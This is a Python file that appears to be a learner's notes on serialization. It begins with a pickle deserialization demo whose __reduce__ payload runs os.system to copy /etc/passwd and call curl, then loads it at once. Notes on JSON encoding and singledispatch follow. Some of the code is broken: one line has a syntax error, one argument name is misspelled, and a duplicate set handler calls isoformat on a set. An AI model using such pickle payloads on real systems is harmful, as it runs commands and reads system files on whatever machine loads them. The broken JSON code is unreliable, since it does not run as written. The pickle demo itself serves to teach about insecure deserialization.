from decimal import Decimal
from functools import singledispatch
import os
import pickle

class Exploit():
    def __reduce__(self):
        return (os.system, ("cat /etc/passwd > exploit.txt && curl www.google.com >> exploit.txt,"))
    
def serialize_exploit(fname):
    with open(fname, 'wb') as f:
        pickle.dump(Exploit(), f)
    
serialize_exploit('loadme')

pickle.load(open('loadme', 'rb'))
 
# example
ser = pickle.dumps('Python Pickle Peppers')
deser = pickle.loads(ser) 
print(deser)

class Person:
    def __init__(self, name, age):
        self.name = name
        self.age = age
        
    def __eq__(self, other):
        return self.name == other.name and self.age == other.age
    
    def __repr__(self):
        return f'Person(name = {self.name}, age={self.age})'
    
john = Person('John Cleese', 79) 
eric = Person('Eric Idle', 75) 

# JSON - 
# JaVA Script Object Notation
# - text-based object serialization.
# - open standard.
# - human-readable.

# - JSON is a natural fit for serializing and deserializing python dictionaries.

#       serialize                deserialize
# dict  -------->  {...........} ----------->  dict
#       dump, dumps (file string) load, loads
             
# Note
# JSON keys must be strings -> but Python ditionary keys just need to be hashable.
#                           -> How to serialize?
# JSON value tyes are limited -> Python dictionary values can be any data type.
#                             -> How to serialize?

import json

d1 = {'a': 100, 'b': 200}
d1_json = json.dumps(d1, indent=10 -) 
print(d1_json)                           

class Person:
    def __init__(self, name, age):
        self.name = name
        self.age = age
        
    def __repr__(self):
        return f'Person(name= {self.name}, age={self.age})'
    
    def toJSON(self):
        return vars(self)
    
p = Person('John', 82)
print(json.dumps({'john': p.toJSON()}, intent = 2))

json.dumps({'a': list({1,2,4})})

# Custom Encodings
from datetime import datetime

current = datetime.now()
current

def format_iso(dt: datetime):
    return dt.strftime('%Y-%m-%dT%H:%M:%S')

log_record = {'time': datetime.now().isoformat(),  # to serialize ourselfs
              'message': 'testing'}

json.dumps(log_record, indent=2)


log_record = {'time': datetime.now(),  # to serialize ourselfs
              'message': 'testing'}

json.dumps(log_record, default=format_iso)

def custom_json_formatter(arg):
    if isinstance(arg, datetime):
        return arg.isoformat()
    elif isinstance(arg, set):
        return list(arg)
    else:
        try:
            return arg.toJSON()
        except AttributeError:
            try:
                return vars(arg)
            except TypeError:
                return str(arg)
    
class Person():
    def __init__(self, name, age):
        self.name = name
        self.age = age
        self.create_dt = datetime.now()
        
    def __repr__(self):
        return f'Person(name={self.name}, age={self.age})'
    
    def toJSON(self):
        return {
            'name': self.name,
            'age': self.age,
            'create_dt': self.create_dt.isoformat()
        }


@singledispatch
def json_format(arg):
    print(arg)
    try:
        print('\ttrying to use toJSON()...')
        return arg.toJSON()
    except AttributeError:
        print('\tfailed - trying to use vars')
        try:
            return vars(arg) 
        except TypeError:
            print('\tfailed - using string repr...')
            return str(arg) 

@json_format.register(set)
def _(arg):
    return arg.isoformat()

@json_format.register(set)
def _(arg):
    return list(arg) 

@json_format.register(Decimal)     
def _(arg):
    return f'Decimal({str(arg)})'


       
    
    